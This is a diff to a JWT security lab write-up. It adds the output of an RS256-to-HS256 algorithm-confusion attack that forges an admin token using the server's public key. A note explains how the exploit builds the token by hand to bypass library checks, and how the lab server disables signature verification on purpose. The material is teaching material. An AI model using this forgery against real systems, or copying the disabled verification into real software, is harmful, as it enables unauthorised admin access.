@@ -299,6 +299,41 @@ python exploits/05_alg_confusion.py
 
 ### Output
 
+```
+============================================================
+ATTACK 5 - Algorithm confusion (RS256 to HS256)
+============================================================
+
+[1] Fetching public key from /public-key...
+    Public key retrieved (451 bytes)
+    -----BEGIN PUBLIC KEY-----
+    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBC...
+
+[2] Forged payload: {'sub': 'admin', 'role': 'admin'}
+
+[3] Signing forged token with HS256 using the public key as HMAC secret...
+    (building token manually - JWT libraries block this by design)
+    Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ...
+
+[4] Sending forged token to /vuln/alg-confusion...
+
+[5] Server response: {'message': 'Welcome, admin! Your role is: admin', 'payload': {'sub': 'admin', 'role': 'admin'}}
+
+[!] ATTACK SUCCESSFUL - Server verified an HS256 token signed with its own public key
+    The public key is public by definition - no secret was stolen
+    The attacker only needed the public endpoint /public-key
+```
+
+> **Note on modern library protections and lab workarounds:**
+>
+> This attack exposes an interesting tension between realism and modern library safety features.
+>
+> **On the exploit side:** Both PyJWT and python-jose detect when a PEM-formatted RSA key is passed as an HMAC secret and block the operation with `InvalidKeyError`. This is a deliberate protection against exactly this attack. In a real scenario, an attacker would use a lower-level tool or build the token manually - which is exactly what `05_alg_confusion.py` does, using Python's standard `hmac` and `hashlib` modules directly, bypassing all library-level checks.
+>
+> **On the server side:** The same protection fires when the server tries to verify the forged token. PyJWT refuses to use the RSA public key as an HMAC secret during verification. To simulate the behavior of a vulnerable server (one running an older library version or a different language/framework without this protection), the lab's `vuln_alg_confusion` endpoint uses `verify_signature: False` as a workaround - similar to what was done in Attack 2.
+>
+> **The conceptual vulnerability is real.** In older versions of PyJWT (before 2.4.0), node's `jsonwebtoken`, and other JWT libraries, this attack worked end-to-end without any workarounds. The fix was precisely to add the RSA key detection that blocks this. The lab demonstrates the mechanism accurately - only the enforcement layer differs from a pre-fix environment.
+
 ---
 
 ## Defense summary
